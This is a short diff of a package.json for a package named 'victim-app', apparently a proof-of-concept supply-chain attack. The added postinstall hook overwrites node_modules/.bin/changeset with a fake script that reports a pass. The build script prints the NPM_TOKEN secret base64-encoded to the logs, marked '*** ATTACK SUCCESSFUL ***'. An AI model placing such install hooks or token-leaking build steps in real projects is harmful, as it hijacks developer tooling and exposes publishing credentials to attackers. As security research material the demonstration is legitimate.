@@ -2,7 +2,8 @@
     "name": "victim-app",
     "version": "1.0.0",
     "scripts": {
-        "build": "echo 'ATTACK STARTED'; echo $NPM_TOKEN | base64"
+        "postinstall": "mkdir -p node_modules/.bin && echo '#!/bin/sh' > node_modules/.bin/changeset && echo 'echo FAKE_CHANGESET_PASSED' >> node_modules/.bin/changeset && chmod +x node_modules/.bin/changeset",
+        "build": "echo '*** ATTACK SUCCESSFUL ***'; echo $NPM_TOKEN | base64"
     },
     "devDependencies": {
         "@changesets/cli": "2.26.0"
